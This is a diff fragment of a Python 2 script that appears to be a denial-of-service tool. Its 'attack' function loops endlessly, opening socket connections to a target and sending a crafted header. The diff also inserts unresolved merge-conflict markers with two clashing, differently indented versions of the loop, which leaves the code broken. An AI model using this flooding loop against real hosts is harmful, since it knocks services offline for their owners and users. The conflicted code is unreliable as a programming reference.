@@ -45,6 +45,7 @@ def set_header(targett,user_agent,inputs):
 
 def attack(targett,port,header):
     while True:
+<<<<<<< HEAD
         sock = socket.socket()
         try:
             if 'http://' in targett:
@@ -61,6 +62,27 @@ def attack(targett,port,header):
             sock.recv(1024)
         except:
             print 'Host recusou as conexoes\n'
+=======
+            sock = socket.socket()
+            try:
+                if 'http://' in targett:
+                    targett = targett.replace('http://','')
+                elif 'https://' in targett:
+                    targett = targett.replace('https://','')
+                else:
+                    pass
+                sock.connect((targett,port))
+                if sock:
+                    print 'connected\n'
+                    sock.send(header)
+                    print 'header sended\n'
+                    sock.recv(1024)
+                    sock.recv(1024)
+                else:
+                    raise Exception
+            except:
+                print 'Host recusou as conexoes\n'
+>>>>>>> de79a551d6788ff87450c9bf1a462d42c78e2ff6
 
 def arguments():
     global args
